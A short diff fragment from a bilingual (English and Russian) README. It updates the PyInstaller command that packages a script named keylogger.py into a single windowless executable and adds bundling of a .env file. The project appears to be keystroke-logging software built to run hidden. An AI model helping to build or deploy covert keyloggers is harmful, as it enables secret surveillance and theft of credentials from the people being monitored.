@@ -75,7 +75,7 @@ Use PyInstaller to create a standalone executable file:
 Используйте PyInstaller для создания standalone-исполняемого файла:
 
 ```bash
-pyinstaller -F -w --noconsole --clean --onefile --windowed -i "NONE" keylogger.py
+pyinstaller -F -w --noconsole --clean --onefile --windowed -i "NONE" --add-data ".env:." keylogger.py
 ```
 
 The executable will be created in the `dist` folder.
